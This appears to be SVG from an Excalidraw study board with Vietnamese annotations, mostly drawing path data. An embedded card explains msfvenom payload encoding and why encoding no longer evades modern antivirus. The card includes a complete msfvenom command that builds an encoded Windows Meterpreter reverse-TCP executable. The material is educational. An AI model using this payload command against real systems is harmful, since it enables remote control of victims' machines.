<path d="M282.33 4939.21 L282.68 4940.27 L283.22 4940.99 L284.58 4942.11 L286.30 4943.37 L289.26 4944.82 L291.39 4945.61 L293.70 4946.21 L296.13 4946.80 L297.32 4947.06 L299.69 4947.46 L302.18 4947.73 L303.30 4947.85 L305.38 4947.85 L307.22 4947.85 L310.30 4947.73 L311.60 4947.66 L312.79 4947.66 L313.91 4947.59 L315.33 4947.53 L316.76 4947.53 L319.78 4947.33 L321.79 4947.26 L323.45 4947.13 L324.93 4946.93 L326.30 4946.80 L327.60 4946.60 L329.97 4946.47 L331.99 4946.21 L333.64 4946.07 L335.24 4945.94 L337.56 4945.74 L339.51 4945.61 L341.94 4945.35 L343.90 4945.21 L345.08 4945.02 L347.57 4944.75 L350.83 4944.29 L352.02 4944.09 L354.09 4943.83 L355.87 4943.63 L359.07 4943.37 L361.44 4943.24 L363.75 4943.04 L365.11 4943.04 L367.96 4942.91 L370.86 4942.91 L373.88 4942.84 L377.02 4942.71 L381.59 4942.58 L384.55 4942.51 L387.39 4942.44 L389.94 4942.44 L392.02 4942.51 L393.79 4942.58 L395.27 4942.64 L396.64 4942.71 L399.19 4943.04 L401.20 4943.30 L402.86 4943.50 L404.28 4943.76 L405.47 4943.90 L406.59 4944.16 L407.66 4944.43 L408.96 4944.75 L410.27 4945.02 L411.75 4945.61 L412.76 4945.81 L414.30 4946.34 L415.66 4946.73 L416.96 4947.06 L418.09 4947.33 L419.10 4947.66 L419.99 4947.99 L421.59 4948.45 L423.24 4948.91 L424.61 4949.31 L425.85 4949.57 L426.92 4949.90 L427.93 4950.17 L428.99 4950.30 L430.36 4950.56 L431.66 4950.70 L433.14 4950.83 L434.62 4950.96 L437.64 4951.15 L441.08 4951.09 L443.45 4950.96 L445.88 4950.70 L447.84 4950.56 L450.09 4950.23 L451.93 4949.97 L453.41 4949.64 L454.89 4949.44 L456.07 4949.11 L457.67 4948.71 L458.62 4948.38 L460.22 4947.92 L461.47 4947.33 L462.59 4946.87 L463.54 4946.34 L464.25 4945.74 L464.96 4945.21 L465.79 4944.43 L466.27 4943.50 L466.68 4942.51 L466.74 4941.39 L466.74 4940.20 L465.91 4937.16 L465.20 4935.18 L464.84 4934.19 L463.24 4931.82 L461.94 4930.30 L460.34 4928.98 L458.50 4927.79 L456.37 4926.74 L453.64 4925.94 L450.74 4925.28 L447.54 4924.69 L445.88 4924.43 L442.39 4924.10 L438.71 4923.83 L434.98 4923.77 L430.89 4923.70 L424.49 4923.77 L419.99 4924.03 L415.42 4924.29 L410.92 4924.56 L408.67 4924.75 L404.28 4925.08 L400.07 4925.35 L396.16 4925.61 L392.67 4925.88 L389.23 4926.01 L385.97 4926.08 L382.95 4926.27 L378.56 4926.47 L377.14 4926.54 L374.36 4926.87 L371.45 4927.26 L368.61 4927.79 L365.64 4928.32 L362.56 4928.98 L359.54 4929.57 L356.58 4930.23 L353.79 4930.89 L351.07 4931.35 L349.82 4931.55 L347.39 4931.88 L345.44 4932.08 L343.66 4932.08 L342.18 4932.08 L340.70 4932.01 L338.80 4931.82 L335.54 4931.49 L334.53 4931.35 L332.58 4931.09 L330.62 4930.76 L328.55 4930.50 L326.89 4930.23 L325.35 4929.97 L324.10 4929.77 L321.91 4929.18 L320.96 4928.98 L319.30 4928.45 L317.94 4927.99 L316.76 4927.59 L315.63 4927.20 L314.68 4926.87 L313.73 4926.47 L311.19 4925.55 L309.59 4924.89 L308.22 4924.43 L307.10 4923.96 L306.15 4923.63 L305.26 4923.30 L304.07 4922.84 L302.95 4922.51 L302.00 4922.18 L300.87 4921.98 L299.87 4921.72 L298.74 4921.52 L297.62 4921.45 L296.43 4921.52 L295.19 4921.65 L293.94 4921.85 L291.16 4922.78 L289.67 4923.30 L288.37 4923.77 L287.30 4924.16 L286.30 4924.69 L285.47 4925.15 L284.64 4925.55 L283.93 4926.01 L282.98 4926.67 L282.21 4927.26 L281.38 4927.93 L280.73 4928.65 L280.13 4929.38 L279.66 4930.23 L279.13 4931.16 L278.83 4932.21 L278.83 4932.21" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M593.62 5140.45 L594.74 5140.51 L595.87 5140.45 L599.19 5140.25 L602.27 5140.11 L605.47 5140.05 L608.84 5139.85 L612.34 5139.72 L615.90 5139.45 L620.93 5139.33 L624.19 5139.26 L625.79 5139.19 L628.99 5139.06 L632.13 5139.06 L635.27 5139.00 L638.30 5139.00 L641.32 5138.93 L644.16 5138.93 L647.07 5138.93 L649.79 5138.93 L652.22 5139.00 L654.30 5139.06 L655.96 5139.06 L657.50 5139.19 L658.86 5139.19 L660.04 5139.26 L661.17 5139.33 L662.30 5139.39 L664.84 5139.65 L667.22 5139.72 L668.40 5139.85 L670.95 5140.05 L673.44 5140.18 L675.75 5140.45 L679.07 5140.64 L680.96 5140.91 L683.99 5141.24 L685.35 5141.37 L686.53 5141.50 L687.84 5141.70 L689.91 5141.77 L692.28 5142.03 L694.24 5142.16 L696.37 5142.36 L698.56 5142.43 L702.12 5142.49 L704.19 5142.56 L706.09 5142.56 L709.59 5142.56 L710.77 5142.69 L712.84 5142.75 L716.52 5142.89 L719.24 5142.95 L721.91 5143.08 L724.64 5143.15 L727.48 5143.22 L730.44 5143.22 L733.59 5143.22 L736.61 5143.22 L739.69 5143.22 L742.71 5143.15 L745.73 5143.08 L748.70 5143.08 L751.54 5142.95 L754.33 5142.95 L756.87 5142.89 L758.24 5142.89 L759.42 5142.89 L763.45 5142.89 L764.99 5142.89 L766.36 5142.89 L767.54 5142.89 L769.14 5142.95 L770.68 5142.95 L772.04 5142.95 L773.47 5143.08 L774.89 5143.08 L776.31 5143.08 L777.79 5143.08 L779.10 5142.95 L780.40 5142.95 L781.76 5142.89 L783.24 5142.89 L784.43 5142.89 L784.43 5142.89" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M759.66 5164.80 L758.83 5164.47 L758.89 5163.15 L759.30 5162.23 L759.78 5161.57 L760.96 5161.70 L761.67 5162.55 L762.09 5163.68 L762.62 5166.32 L762.68 5168.30 L762.39 5171.34 L761.91 5173.64 L761.38 5175.75 L760.67 5177.60 L760.02 5179.05 L759.19 5180.11 L758.59 5180.97 L757.94 5181.63 L757.05 5182.09 L757.05 5182.09" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M754.21 5189.62 L753.85 5190.74 L753.56 5191.80 L753.26 5192.72 L753.26 5192.72" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M304.37 5177.08 L304.02 5176.09 L304.25 5175.16 L304.96 5174.70 L307.16 5173.45 L309.59 5172.39 L312.19 5171.27 L317.11 5169.68 L320.73 5168.63 L324.64 5167.84 L328.79 5167.11 L330.92 5166.78 L335.30 5166.25 L339.75 5165.73 L344.31 5165.33 L348.93 5164.93 L353.62 5164.73 L358.42 5164.47 L363.16 5164.34 L368.02 5164.27 L372.87 5164.34 L377.73 5164.47 L382.53 5164.73 L387.33 5165.07 L392.07 5165.33 L396.82 5165.66 L401.67 5165.92 L406.53 5166.12 L411.63 5166.05 L416.84 5165.92 L419.51 5165.73 L424.84 5165.46 L432.61 5164.87 L437.59 5164.47 L442.27 5164.14 L446.89 5163.88 L451.45 5163.61 L455.96 5163.22 L460.52 5162.95 L462.77 5162.82 L467.27 5162.49 L471.66 5162.23 L475.87 5162.10 L481.38 5161.77 L484.99 5161.70 L488.31 5161.63 L491.57 5161.63 L494.83 5161.70 L496.37 5161.70 L499.51 5161.77 L502.59 5161.83 L505.67 5161.96 L508.70 5161.96 L511.72 5162.03 L514.68 5162.10 L518.83 5162.23 L521.26 5162.43 L524.58 5162.62 L526.89 5162.89 L528.84 5163.02 L530.62 5163.15 L532.82 5163.22 L535.30 5163.28 L537.44 5163.28 L539.27 5163.28 L540.87 5163.28 L542.30 5163.28 L543.66 5163.22 L544.96 5163.22 L546.62 5163.22 L548.93 5163.22 L550.06 5163.15 L551.90 5163.15 L553.56 5163.02 L554.98 5162.95 L556.34 5162.89 L557.47 5162.82 L558.95 5162.75 L560.13 5162.75 L561.26 5162.62 L562.39 5162.55 L563.51 5162.49 L563.51 5162.49" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M543.42 5177.54 L543.13 5176.68 L543.60 5175.95 L544.31 5175.49 L545.56 5175.56 L546.27 5176.02 L546.86 5176.81 L547.16 5177.80 L547.27 5179.05 L547.27 5180.38 L546.86 5182.88 L546.62 5183.81 L546.21 5185.33 L545.79 5186.45 L545.32 5187.50 L545.32 5187.50" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M544.73 5196.55 L543.19 5198.73 L542.18 5199.91 L541.29 5200.77 L540.64 5201.50 L540.10 5202.16 L540.10 5202.16" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M981.41 5071.94 L981.35 5070.75 L981.35 5069.56 L981.53 5068.57 L981.76 5069.56 L981.82 5074.18 L981.82 5075.57 L981.88 5079.79 L981.88 5081.18 L982.18 5083.82 L982.47 5086.33 L982.89 5088.44 L983.36 5090.09 L983.84 5091.41 L984.31 5092.33 L984.79 5093.06 L985.50 5093.78 L986.21 5094.24 L985.50 5094.71 L983.42 5096.55 L982.06 5098.14 L980.93 5099.99 L980.16 5101.97 L979.51 5104.14 L979.27 5106.45 L979.27 5108.96 L979.45 5111.80 L979.51 5113.19 L979.75 5116.16 L980.10 5119.13 L980.40 5121.90 L980.70 5126.06 L980.82 5128.50 L980.87 5130.48 L980.70 5132.26 L980.58 5133.85 L980.40 5134.97 L980.22 5135.96 L979.75 5137.48 L979.10 5138.66 L978.56 5139.45 L977.56 5140.05 L976.31 5139.78 L975.78 5138.93 L975.78 5138.93" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M995.22 5109.75 L996.22 5109.62 L997.47 5109.62 L1000.31 5109.75 L1001.50 5109.89 L1003.57 5109.95 L1005.41 5110.02 L1006.95 5110.02 L1008.25 5110.08 L1009.79 5110.08 L1009.79 5110.08" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1014.95 5103.15 L1016.02 5102.96 L1016.90 5103.35 L1017.62 5103.81 L1018.15 5104.54 L1019.22 5107.71 L1019.27 5109.56 L1019.04 5111.21 L1018.44 5113.71 L1017.62 5116.03 L1016.37 5118.01 L1015.13 5119.65 L1013.76 5120.58 L1013.76 5120.58" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="1035.64" y="5096.32" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="1035.64" dy="0">chưa hiểu về</tspan><tspan x="1035.64" dy="20">bối cảnh tấn</tspan><tspan x="1035.64" dy="20">công cho lắm</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M971.04 5335.15 L971.16 5336.41 L972.40 5336.47 L973.70 5336.47 L976.55 5336.67 L977.97 5336.81 L981.11 5337.07 L985.79 5337.80 L988.99 5338.26 L992.19 5338.98 L995.21 5339.77 L998.24 5340.57 L1000.84 5341.43 L1003.33 5342.22 L1004.58 5342.61 L1006.77 5343.47 L1008.73 5344.26 L1010.50 5345.12 L1011.87 5345.71 L1012.87 5346.24 L1013.76 5346.64 L1014.53 5347.04 L1015.42 5347.43 L1016.37 5347.89 L1016.37 5347.89" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1015.60 5337.99 L1015.01 5337.33 L1016.01 5337.60 L1016.61 5338.19 L1017.20 5339.11 L1017.73 5340.04 L1018.44 5341.49 L1019.04 5342.74 L1019.33 5343.87 L1019.51 5344.92 L1019.51 5346.31 L1019.16 5347.70 L1017.73 5350.40 L1016.37 5351.85 L1015.78 5352.38 L1014.53 5353.04 L1014.53 5353.04" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="994.70" y="5379.07" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="994.70" dy="0">cách kích hoạt payload</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M499.39 5635.46 L499.16 5634.54 L498.86 5633.55 L498.44 5634.54 L498.21 5636.25 L498.03 5638.96 L498.15 5640.41 L498.27 5643.51 L498.80 5646.68 L499.51 5650.11 L500.70 5653.54 L502.18 5656.91 L504.02 5660.08 L506.27 5662.85 L510.18 5666.61 L512.96 5668.66 L515.99 5670.31 L517.47 5671.04 L520.84 5672.22 L524.04 5673.21 L527.13 5673.87 L530.33 5674.34 L533.17 5674.67 L535.90 5674.86 L538.39 5674.93 L540.28 5674.93 L542.00 5674.93 L543.48 5674.80 L544.73 5674.53 L545.85 5674.34 L546.80 5674.07 L547.81 5673.67 L547.81 5673.67" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M551.48 5663.97 L550.65 5663.58 L551.42 5665.82 L552.37 5667.60 L553.32 5669.85 L553.73 5670.97 L554.86 5674.47 L555.22 5676.97 L555.33 5678.03 L555.16 5681.27 L554.86 5683.51 L554.03 5685.75 L553.08 5687.60 L552.07 5688.79 L551.01 5689.45 L549.64 5689.58 L549.64 5689.58" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="569.38" y="5684.79" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="569.38" dy="0">cái này có vẻ giống với shellcode khi mình khai thác buffer overflow</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M276.69 5204.75 C393.77 5205.17,509.63 5206.88,690.36 5206.11 M276.58 5206.23 C390.46 5205.90,503.97 5205.93,690.30 5205.28 M690.03 5205.15 C689.92 5231.68,691.18 5253.62,690.53 5276.36 M691.24 5206.17 C691.90 5228.32,690.49 5250.52,690.33 5277.64 M690.21 5277.16 C591.08 5278.31,490.05 5279.10,275.32 5277.03 M690.57 5278.43 C552.96 5278.82,416.01 5278.39,276.57 5278.27 M275.75 5276.63 C276.21 5254.13,277.08 5233.10,275.61 5205.85 M276.97 5278.76 C277.72 5254.70,276.22 5233.08,275.94 5205.57" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M684.64 5969.04 L683.99 5968.05 L682.98 5967.53 L682.09 5967.20 L679.84 5966.67 L677.35 5966.27 L675.93 5966.14 L672.90 5966.07 L669.70 5966.34 L666.39 5966.73 L663.13 5967.33 L659.51 5968.38 L654.65 5970.23 L651.87 5971.55 L650.62 5972.28 L648.37 5973.80 L646.47 5975.44 L644.70 5977.23 L643.16 5979.21 L641.91 5981.32 L640.96 5983.50 L640.31 5986.01 L640.07 5987.19 L639.84 5989.64 L639.78 5991.75 L639.96 5993.46 L640.55 5996.04 L641.38 5998.08 L642.39 5999.93 L643.93 6001.58 L644.87 6002.37 L647.01 6003.89 L649.56 6005.28 L652.46 6006.40 L655.90 6007.39 L659.51 6008.25 L665.50 6009.24 L667.63 6009.57 L671.90 6009.96 L676.28 6010.29 L680.67 6010.36 L685.05 6010.36 L689.56 6010.29 L693.94 6010.10 L698.27 6009.96 L700.16 6009.90 L703.90 6009.70 L709.29 6009.63 L712.73 6009.50 L716.10 6009.37 L719.24 6009.24 L722.39 6009.17 L725.35 6008.97 L726.83 6008.91 L729.79 6008.58 L732.76 6008.25 L735.60 6007.85 L738.33 6007.59 L741.11 6007.06 L743.78 6006.60 L747.87 6005.81 L749.23 6005.41 L751.84 6004.88 L754.39 6004.15 L756.87 6003.43 L759.24 6002.70 L761.56 6001.84 L763.81 6001.05 L765.76 6000.33 L766.77 5999.93 L767.78 5999.60 L769.38 5998.94 L770.74 5998.41 L772.87 5997.55 L773.76 5997.16 L774.89 5996.57 L775.90 5996.04 L777.32 5995.05 L778.62 5993.79 L779.81 5992.14 L780.81 5990.30 L781.64 5988.38 L782.18 5986.40 L782.53 5984.62 L782.53 5983.10 L782.36 5981.71 L781.82 5979.47 L780.76 5977.29 L779.27 5975.31 L777.26 5973.60 L776.25 5972.67 L773.59 5971.09 L770.62 5969.44 L767.30 5968.05 L761.79 5966.07 L757.64 5964.88 L753.38 5963.76 L751.13 5963.24 L746.62 5962.31 L741.82 5961.72 L737.02 5961.12 L732.04 5960.73 L726.83 5960.33 L721.08 5960.00 L714.80 5959.74 L708.22 5959.54 L701.41 5959.54 L694.59 5959.80 L687.60 5960.40 L680.67 5961.32 L673.50 5962.51 L667.33 5963.70 L662.18 5964.82 L659.99 5965.15 L658.09 5965.61 L658.09 5965.61" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M258.15 6018.01 L259.27 6018.15 L260.40 6018.21 L261.70 6018.28 L262.77 6018.41 L263.96 6018.54 L265.32 6018.61 L267.87 6019.01 L269.94 6019.20 L271.13 6019.34 L272.25 6019.40 L274.27 6019.60 L277.47 6019.80 L278.71 6020.00 L279.90 6020.06 L281.02 6020.13 L282.15 6020.19 L283.57 6020.39 L285.94 6020.53 L287.07 6020.59 L289.14 6020.72 L290.98 6020.72 L292.58 6020.79 L293.94 6020.85 L295.30 6020.92 L298.21 6021.25 L300.16 6021.45 L301.76 6021.58 L303.07 6021.65 L304.37 6021.84 L305.56 6021.98 L306.68 6022.04 L307.93 6022.31 L310.18 6022.64 L311.24 6022.77 L313.02 6023.03 L316.16 6023.30 L317.41 6023.49 L318.71 6023.63 L321.08 6024.02 L322.39 6024.15 L324.76 6024.55 L327.01 6024.81 L328.13 6024.95 L331.16 6025.41 L332.16 6025.54 L334.06 6025.80 L337.26 6026.20 L339.16 6026.46 L340.87 6026.60 L343.19 6026.93 L345.38 6027.13 L347.69 6027.32 L349.70 6027.45 L352.01 6027.72 L353.97 6027.78 L355.69 6027.91 L357.23 6028.05 L359.96 6028.25 L363.57 6028.58 L365.94 6028.91 L367.07 6028.97 L369.20 6029.24 L371.45 6029.57 L372.46 6029.70 L375.90 6030.03 L376.90 6030.16 L380.46 6030.49 L382.89 6030.62 L385.44 6030.82 L386.56 6030.88 L389.35 6030.95 L393.50 6030.88 L396.34 6030.82 L399.36 6030.62 L402.50 6030.49 L405.59 6030.36 L408.73 6030.16 L410.21 6030.03 L413.41 6029.83 L416.49 6029.63 L419.57 6029.37 L424.07 6028.91 L427.10 6028.58 L430.12 6028.11 L431.60 6027.85 L437.29 6026.99 L440.01 6026.60 L442.74 6026.20 L445.41 6025.74 L448.07 6025.34 L450.62 6024.95 L451.99 6024.68 L455.60 6023.95 L458.03 6023.49 L460.34 6023.03 L462.24 6022.64 L464.25 6022.24 L466.33 6021.71 L468.40 6021.25 L469.41 6020.92 L471.48 6020.46 L473.61 6019.93 L475.87 6019.27 L477.82 6018.81 L479.42 6018.28 L480.90 6018.01 L482.09 6017.68 L483.21 6017.35 L484.64 6017.03 L485.82 6016.70 L486.95 6016.50 L488.13 6016.17 L489.32 6015.90 L490.44 6015.57 L491.63 6015.31 L492.64 6015.11 L493.88 6014.78 L494.89 6014.65 L495.84 6014.38 L496.96 6014.25 L498.15 6014.19 L499.45 6013.99 L500.70 6013.99 L501.82 6014.12 L501.82 6014.12" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M450.44 6048.90 L449.67 6049.37 L449.32 6050.29 L449.20 6051.61 L449.56 6054.78 L450.03 6057.62 L450.68 6060.45 L451.75 6063.16 L452.34 6064.35 L453.82 6066.79 L455.78 6069.17 L458.09 6071.41 L460.58 6073.26 L463.01 6074.71 L465.79 6076.10 L467.10 6076.76 L470.95 6078.41 L473.38 6079.27 L475.81 6080.19 L478.06 6080.91 L480.13 6081.57 L481.73 6082.10 L483.04 6082.50 L484.04 6082.83 L485.23 6083.09 L486.24 6082.90 L486.24 6082.90" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M484.76 6066.46 L484.46 6065.34 L485.23 6065.74 L486.24 6066.79 L487.54 6068.37 L488.84 6070.15 L490.09 6072.07 L491.81 6075.11 L492.58 6077.28 L492.99 6078.47 L493.23 6081.18 L492.76 6084.28 L491.39 6087.98 L488.67 6091.94 L485.47 6095.57 L483.51 6096.95 L483.51 6096.95" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="504.43" y="6092.95" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="504.43" dy="0">tại sao cái này là để nhúng?</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">

<rect x="200.7257642244034" y="6259.638698518247" width="978.2221815321184" height="975.5543028552125" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="200.7257642244034" y="6259.638698518247" width="978.2221815321184" height="975.5543028552125" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">📘 Encoding thực chất làm gì?</span>
      </div>
      <a href="#doc-da8c957a70ada879181eb0ad9b579bd1ec845a7e" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Ok mày, nghe tao giải thích về <strong>encoding</strong> trong msfvenom nhé.</p>
<h3>📘 Encoding thực chất làm gì?</h3>
<ul>
<li>Encoder biến đổi dãy byte của payload sang một dạng khác, thường dùng <strong>XOR</strong> với key thay đổi, kèm một <strong>decoder stub</strong> nhỏ ở đầu.</li>
<li>Khi payload chạy, decoder stub thực thi trước, giải mã payload về dạng gốc trong bộ nhớ, rồi mới chạy tiếp.</li>
</ul>
<h3>🎯 Mục đích chính của encoding:</h3>
<ul>
<li><strong>Loại bỏ ký tự xấu (bad characters)</strong>: Một số kênh khai thác (ví dụ buffer overflow qua hàm copy chuỗi) không chịu được byte null <code>\x00</code>, xuống dòng <code>\x0a</code>... Encoding giúp payload tránh mấy byte đó.</li>
<li><strong>Tuân thủ định dạng</strong>: Có nơi chỉ cho phép ký tự ASCII in được, encoding giúp payload nằm trong giới hạn đó.</li>
</ul>
<h3>🧪 Dùng encoder với msfvenom:</h3>
<ul>
<li><code>-e</code> (encoder) – chọn encoder, ví dụ <code>-e x86/shikata_ga_nai</code></li>
<li><code>-i</code> (iterations) – số lần lặp encode, ví dụ <code>-i 3</code></li>
<li><code>-b</code> (bad chars) – liệt kê ký tự cần tránh, ví dụ <code>-b &#39;\x00\x0a\x0d&#39;</code></li>
</ul>
<p><strong>Ví dụ:</strong></p>
<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 -o encoded.exe
</code></pre>
<p>Khi dùng <code>-b</code> mà không chỉ định <code>-e</code>, msfvenom tự chọn encoder phù hợp.</p>
<h3>❌ Vì sao encoding không bypass được antivirus hiện đại?</h3>
<p>Ngày xưa AV chỉ quét <strong>chữ ký tĩnh</strong> (so byte với database). Encoding làm thay đổi byte nên qua mặt được. Nhưng giờ AV có:</p>
<ul>
<li><strong>Heuristic analysis</strong>: nhìn hành vi code, thấy decoder stub giải mã rồi chạy code trong memory là báo động.</li>
<li><strong>Sandboxing</strong>: cho file chạy trong môi trường cô lập để quan sát, payload tự lộ.</li>
<li><strong>AMSI</strong>: trên Windows, can thiệp lúc script/payload giải mã xong trước khi thực thi.</li>
<li><strong>Machine learning</strong>: học từ hàng triệu mẫu, nhận ra mẫu độc dù có biến đổi.</li>
</ul>
<p>➡️ Vì vậy, chạy <code>shikata_ga_nai</code> 10 vòng với payload Meterpreter mặc định vẫn bị tóm ngay. Bản thân cái decoder stub đã là signature nổi tiếng rồi.</p>
<h3>✅ Khi nào encoding vẫn có ích?</h3>
<ul>
<li><strong>Trong phát triển exploit</strong>: khi cần tránh bad chars do giới hạn kỹ thuật (buffer overflow). Đây là nhu cầu kỹ thuật thật sự, không phải để trốn tránh.</li>
<li>Muốn bypass thật sự thì phải dùng kỹ thuật nâng cao ngoài msfvenom: custom loader, process injection, AMSI bypass, obfuscation... Mấy đó thuộc module nâng cao hơn.</li>
</ul>
<p>Tóm gọn: <strong>encoding chỉ để xử lý kỹ thuật (bad chars), không phải để trốn AV</strong>. Đừng ảo tưởng nhé! 😎</p>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(-56.74,-107.24)">
<text x="174.83" y="6178.16" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="174.83" dy="0">V)</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M511.92 6255.56 L511.27 6253.45 L510.85 6252.65 L509.73 6251.14 L508.25 6249.75 L506.35 6248.50 L503.86 6247.38 L501.08 6246.52 L499.48 6246.19 L496.22 6245.79 L492.72 6245.86 L488.57 6246.45 L481.94 6248.76 L477.49 6250.81 L473.70 6252.72 L470.32 6254.90 L466.83 6257.41 L465.28 6258.80 L462.62 6261.50 L460.19 6264.27 L458.35 6267.24 L457.34 6270.08 L456.93 6273.12 L457.11 6276.15 L458.23 6279.25 L461.79 6284.34 L463.63 6285.92 L467.83 6288.89 L472.93 6291.40 L478.56 6293.58 L484.19 6295.22 L490.00 6296.61 L495.68 6297.80 L501.31 6298.72 L506.65 6299.52 L509.25 6299.78 L517.14 6300.11 L522.23 6299.91 L527.39 6299.38 L533.08 6298.33 L538.77 6296.94 L544.16 6295.16 L549.31 6293.18 L554.17 6291.00 L556.43 6289.88 L560.40 6287.84 L563.60 6285.99 L566.20 6284.27 L569.11 6281.90 L570.29 6280.11 L571.00 6278.13 L570.94 6275.89 L570.11 6272.85 L568.40 6269.29 L567.09 6267.04 L564.07 6262.62 L560.04 6257.67 L555.54 6252.85 L550.38 6248.63 L544.81 6244.87 L538.59 6241.83 L529.28 6238.86 L522.88 6237.81 L519.63 6237.67 L512.81 6238.07 L505.76 6239.52 L502.20 6240.78 L502.20 6240.78" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1156.07 6359.91 L1155.42 6358.92 L1155.42 6357.73 L1155.65 6356.48 L1156.13 6355.35 L1156.66 6354.36 L1157.43 6353.77 L1158.62 6353.70 L1160.34 6355.42 L1161.52 6357.40 L1162.35 6360.24 L1162.88 6363.60 L1163.12 6367.96 L1163.24 6370.27 L1163.24 6375.09 L1163.12 6380.10 L1163.06 6384.99 L1163.12 6389.67 L1163.24 6393.97 L1163.54 6397.53 L1164.31 6402.21 L1165.08 6405.05 L1165.55 6406.31 L1166.62 6408.55 L1167.74 6410.53 L1168.87 6411.98 L1170.00 6412.91 L1170.94 6413.50 L1172.25 6413.77 L1173.31 6413.50 L1173.02 6412.51 L1170.41 6414.29 L1168.10 6416.34 L1165.67 6419.04 L1163.48 6422.41 L1162.41 6424.12 L1160.69 6428.09 L1159.15 6432.57 L1158.20 6437.06 L1157.73 6444.26 L1158.03 6449.54 L1158.74 6455.68 L1159.68 6461.55 L1160.93 6467.42 L1161.46 6470.33 L1162.65 6475.87 L1163.77 6480.95 L1164.54 6485.51 L1165.20 6490.00 L1165.67 6496.00 L1165.67 6499.63 L1165.43 6502.93 L1164.90 6506.03 L1164.48 6507.55 L1163.48 6510.26 L1161.94 6512.70 L1160.04 6514.35 L1157.67 6515.08 L1154.83 6514.81 L1151.74 6513.75 L1148.72 6511.97 L1146.11 6509.86 L1144.28 6507.68 L1142.97 6505.51 L1142.97 6505.51" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
